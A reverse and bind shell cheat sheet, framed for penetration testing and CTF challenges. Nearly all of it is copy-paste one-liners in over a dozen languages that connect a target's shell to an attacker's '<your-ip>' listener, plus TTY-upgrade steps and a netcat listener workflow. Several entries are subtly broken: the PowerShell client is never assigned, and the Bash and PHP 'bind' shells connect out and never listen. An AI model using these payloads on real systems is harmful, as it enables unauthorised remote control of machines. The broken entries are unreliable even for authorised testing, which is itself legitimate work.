# Shell Spawning Techniques

When performing penetration testing or participating in Capture The Flag (CTF) challenges, you might often need to spawn a shell or make an existing shell interactive. Below are various techniques to achieve this.

## Reverse Shells

### Bash
#### Bash TCP Reverse Shell
```sh
bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1
```
#### Bash UDP Reverse Shell
```sh
sh -i >& /dev/udp/<your-ip>/<your-port> 0>&1
```

### Netcat (nc)
#### Netcat with `-e` option
```sh
nc -e /bin/sh <your-ip> <your-port>
```
#### Netcat without `-e` option
```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <your-ip> <your-port> > /tmp/f
```

### Python
#### Python 2
```python
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<your-ip>",<your-port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```
#### Python 3
```python
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<your-ip>",<your-port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

### Perl
```perl
perl -e 'use Socket;$i="<your-ip>";$p=<your-port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```php
php -r '$sock=fsockopen("<your-ip>",<your-port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```ruby
ruby -rsocket -e 'f=TCPSocket.open("<your-ip>",<your-port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### PowerShell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<your-ip>",<your-port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<your-ip>/<your-port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Socat
```sh
socat TCP:<your-ip>:<your-port> EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

### Telnet
```sh
rm -f /tmp/p; mknod /tmp/p p && telnet <your-ip> <your-port> 0/tmp/p
```

### Node.js
```js
require('child_process').exec('nc -e /bin/sh <your-ip> <your-port>')
```

### Lua
```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<your-ip>','<your-port>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### Awk
```sh
awk 'BEGIN {s = "/inet/tcp/0/<your-ip>/<your-port>"; while (1) { do { printf "shell> " |& s; s |& getline c; if (c) while ((c |& getline) > 0) print $0 |& s; close(c) } while (c != "exit") close(s) }}'
```

### /dev/tcp
```sh
/bin/bash -c 'bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1'
```

## Bind Shells

### Bash
```sh
bash -i >& /dev/tcp/0.0.0.0/<port> 0>&1
```

### Netcat
```sh
nc -lp <port> -e /bin/sh
```

### Python
```python
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0",<port>)); s.listen(1); c,a=s.accept(); os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```php
php -r '$sock=fsockopen("0.0.0.0",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl
```perl
perl -e 'use Socket;$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");'
```

### Ruby
```ruby
ruby -rsocket -e 'server=TCPServer.new("<port>"); while(conn=server.accept) do; fork { conn.puts "Welcome"; exec "/bin/sh -i"; }; end'
```

### PowerShell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, <port>); $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2  = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }
```

## Upgrading to Interactive Shells

### Using Python
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Using Script
```sh
script -qc /bin/bash /dev/null
```

### Using socat
On the attacker machine:
```sh
socat file:`tty`,raw,echo=0 tcp-listen:<port>
```
On the target machine:
```sh
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<your-ip>:<port>
```

### Fixing Terminal Settings
If you get a shell but it's not interactive, background the shell and run:
```sh
stty raw -echo; fg
```
Then:
```sh
export TERM=xterm
stty rows <num> columns <num>
```

## Example Workflow
1. **Setup listener on attacker machine:**
   ```sh
   nc -lvnp 4444
   ```
2. **Run reverse shell command on target machine.**

### Notes
- Replace `<your-ip>` with your attack machine's IP address.
- Replace `<port>` with the port number you are listening on.
- Ensure to background the shell and fix terminal settings for an interactive shell:
  ```sh
  # Press Ctrl+Z to background the shell
  stty raw -echo; fg
  export TERM=xterm
  stty rows 25 columns 80
  ```
